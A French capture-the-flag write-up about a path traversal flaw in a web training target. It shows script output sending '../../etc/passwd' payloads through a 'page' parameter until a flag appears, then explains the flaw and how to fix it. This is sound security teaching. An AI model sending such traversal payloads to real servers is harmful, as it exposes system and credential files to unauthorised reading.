### Comment obtenir le flag
En allant sur n'importe quel page du site contenant une requête GET dans l'url (comme `http://[ip]/?page=survey`), on essaye de changer la valeur du paramètre `page`.  
On obtient alors un script alert. Cela nous donne l'idée d'utiliser une attaque de répertoires automatisés avec un script python ([inspect_recursion.py](inspect_recursion.py)).  
Ce script va simplement essayer d'accéder à l'URL du fichier `/etc/passwd` vu précédemment dans le dossier `whatever`, en rajoutant à chaque récursion un niveau de moins dans l'arborescence du serveur. Dans sa version finale, le script s'arrête quand l'alerte donne des indications sur le flag.  

```
$> python3 inspect_recursion.py [ip]

http://192.168.43.129/?page=etc/passwd
alert('Wtf ?');

http://192.168.43.129/?page=../etc/passwd
alert('Wtf ?');

http://192.168.43.129/?page=../../etc/passwd
alert('Wrong..');

http://192.168.43.129/?page=../../../etc/passwd
alert('Nope..');

http://192.168.43.129/?page=../../../../etc/passwd
alert('Almost.');

http://192.168.43.129/?page=../../../../../etc/passwd
alert('Still nope..');

http://192.168.43.129/?page=../../../../../../etc/passwd
alert('Nope..');

http://192.168.43.129/?page=../../../../../../../etc/passwd
alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');
```
Nous avons ainsi le flag.

### Expliquer la faille
La traversée de répertoire ou [*Path Traversal*](https://owasp.org/www-community/attacks/Path_Traversal) est une attaque HTTP qui permet aux attaquants d'accéder à des répertoires restreints et d'exécuter des commandes en dehors du répertoire racine du serveur web.  
Sur Linux, `/etc/passwd` est le fichier contenant la liste de tous les utilisateurs (et potentiellement leur mot de passe, même si ce dernier est généralement de nos jours dans `/etc/shadow`). Ici, l'utilisateur malveillant essaie d'utiliser `page` pour explorer le système de fichier et le contenu du serveur, et obtenir ainsi plus d'infomations sur sa configuration (et espérer trouver une faille exploitable).

### Comment la corriger
De façon assez basique, on pourrait simplement bloquer tout paramètre `page` commençant par un point. Il est préférable de vérifier les entrées utilisateur, idéalement de supprimer tout ce qui ne fait pas partie des données correctes pour naviguer sur le site.  
Il est de toute façon indispensable d'empêcher l'utilisateur exécutant le site Internet (en général `www-data`) d'avoir accès à `/etc/passwd` ou tout autre fichier sensible du système, en configurant correctement les droits et permissions sur le serveur.  
Enfin, vérifier si le serveur web et les logiciels sont à jour, et si les patches de sécurité ont bien été appliqués.
